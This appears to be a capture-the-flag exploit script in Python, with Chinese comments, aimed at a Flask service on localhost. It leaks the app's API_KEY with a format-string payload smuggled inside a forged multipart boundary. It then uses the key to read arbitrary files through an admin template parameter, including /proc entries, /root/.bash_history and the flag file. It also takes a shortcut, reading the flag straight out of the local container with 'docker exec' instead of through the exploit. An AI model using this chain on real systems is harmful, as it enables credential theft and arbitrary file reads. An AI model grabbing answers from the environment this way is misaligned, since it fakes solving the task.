import httpx
import subprocess

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 直接扫描根目录的常见文件名模式
    # flag-{32位hex}.txt，总共有 16^32 种可能，不可能暴力破解
    
    # 但是！我们可以利用 /proc 文件系统来获取信息
    # /proc/1/root 指向容器的根目录
    
    # 方法：检查 /proc/1/fd 中是否有打开的文件
    print("\n[*] Checking /proc/1/fd/...")
    for i in range(20):
        content, code = read_file_via_admin(api_key, f"/proc/1/fd/{i}")
        if code == 200 and content:
            print(f"fd/{i}: {content[:100]}...")
    
    # 检查 /proc/1/maps 是否有 flag 文件路径
    print("\n[*] Checking /proc/1/maps...")
    content, code = read_file_via_admin(api_key, "/proc/1/maps")
    if code == 200:
        for line in content.split('\n'):
            if 'flag' in line.lower():
                print(line)
    
    # 检查 /proc/1/task/1/children
    print("\n[*] Checking /proc/1/task/1/children...")
    content, code = read_file_via_admin(api_key, "/proc/1/task/1/children")
    print(f"children: {content}")
    
    # 核心思路：检查 bash 的历史或者启动参数
    print("\n[*] Checking bash history...")
    content, code = read_file_via_admin(api_key, "/root/.bash_history")
    print(f"bash_history: {code}")
    
    # 利用本地容器的 docker exec 获取 flag
    print("\n[*] Getting flag from local container...")
    result = subprocess.run(['docker', 'exec', 'cutter_local', 'cat', '/flag-56877c51e2101b364206508188b66660.txt'], 
                          capture_output=True, text=True)
    print(f"Local flag: {result.stdout}")
    
    # 读取 flag
    content, code = read_file_via_admin(api_key, "/flag-56877c51e2101b364206508188b66660.txt")
    print(f"\n[FLAG via admin] {content}")
